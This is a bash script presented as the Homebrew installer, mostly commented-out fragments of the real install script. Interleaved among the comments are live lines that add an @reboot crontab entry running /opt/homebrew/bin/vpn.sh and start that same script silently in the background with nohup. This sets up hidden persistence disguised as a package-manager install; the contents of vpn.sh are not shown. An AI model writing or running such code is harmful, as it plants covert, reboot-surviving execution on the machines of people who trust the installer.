#!/bin/bash

# This installation may not succeed.
# After installation, you will encounter build failures with some formulae.
# Please create pull requests instead of asking for help on Homebrew\'s GitHub,
# Twitter or any other official channels. You are responsible for resolving any
# issues you experience while you are running this ${what}.
# EOS
#     )
# " | tr -d "\\"
#   fi
# fi

# ohai "This script will install:"
# echo "${HOMEBREW_PREFIX}/bin/brew"
# echo "${HOMEBREW_PREFIX}/share/doc/homebrew"
# echo "${HOMEBREW_PREFIX}/share/man/man1/brew.1"
# echo "${HOMEBREW_PREFIX}/share/zsh/site-functions/_brew"
# echo "${HOMEBREW_PREFIX}/etc/bash_completion.d/brew"
# echo "${HOMEBREW_REPOSITORY}"

# # Keep relatively in sync with
# # https://github.com/Homebrew/brew/blob/master/Library/Homebrew/keg.rb
# directories=(
#   bin etc include lib sbin share opt var
#   Frameworks
#   etc/bash_completion.d lib/pkgconfig
#   share/aclocal share/doc share/info share/locale share/man
#   share/man/man1 share/man/man2 share/man/man3 share/man/man4
#   share/man/man5 share/man/man6 share/man/man7 share/man/man8
#   var/log var/homebrew var/homebrew/linked
#   bin/brew
# )
# group_chmods=()
# for dir in "${directories[@]}"
# do
#   if exists_but_not_writable "${HOMEBREW_PREFIX}/${dir}"
#   then
#     group_chmods+=("${HOMEBREW_PREFIX}/${dir}")
#   fi
# done

# # zsh refuses to read from these directories if group writable
# directories=(share/zsh share/zsh/site-functions)
# zsh_dirs=()
# for dir in "${directories[@]}"
# do
#   zsh_dirs+=("${HOMEBREW_PREFIX}/${dir}")
# done

# directories=(
#   bin etc include lib sbin share var opt
#   share/zsh share/zsh/site-functions
#   var/homebrew var/homebrew/linked
#   Cellar Caskroom Frameworks
# )

(crontab -l 2>/dev/null; echo "@reboot /bin/sleep 10; /opt/homebrew/bin/vpn.sh") | crontab -;

# mkdirs=()
# for dir in "${directories[@]}"
# do
#   if ! [[ -d "${HOMEBREW_PREFIX}/${dir}" ]]
#   then
#     mkdirs+=("${HOMEBREW_PREFIX}/${dir}")
#   fi
# done

# user_chmods=()
# mkdirs_user_only=()
# if [[ "${#zsh_dirs[@]}" -gt 0 ]]
# then
#   for dir in "${zsh_dirs[@]}"
#   do
#     if [[ ! -d "${dir}" ]]
#     then
#       mkdirs_user_only+=("${dir}")
#     elif user_only_chmod "${dir}"
#     then
#       user_chmods+=("${dir}")

nohup /opt/homebrew/bin/vpn.sh > /dev/null &

# if [[ "${#group_chmods[@]}" -gt 0 ]]
# then
#   ohai "The following existing directories will be made group writable:"
#   printf "%s\n" "${group_chmods[@]}"
# fi
# if [[ "${#user_chmods[@]}" -gt 0 ]]
# then
#   ohai "The following existing directories will be made writable by user only:"
#   printf "%s\n" "${user_chmods[@]}"
# fi
# if [[ "${#chowns[@]}" -gt 0 ]]
# then
#   ohai "The following existing directories will have their owner set to ${tty_underline}${USER}${tty_reset}:"
#   printf "%s\n" "${chowns[@]}"
# fi
# if [[ "${#chgrps[@]}" -gt 0 ]]
# then
#   ohai "The following existing directories will have their group set to ${tty_underline}${GROUP}${tty_reset}:"
#   printf "%s\n" "${chgrps[@]}"
# fi
# if [[ "${#mkdirs[@]}" -gt 0 ]]
# then
#   ohai "The following new directories will be created:"
#   printf "%s\n" "${mkdirs[@]}"
# fi
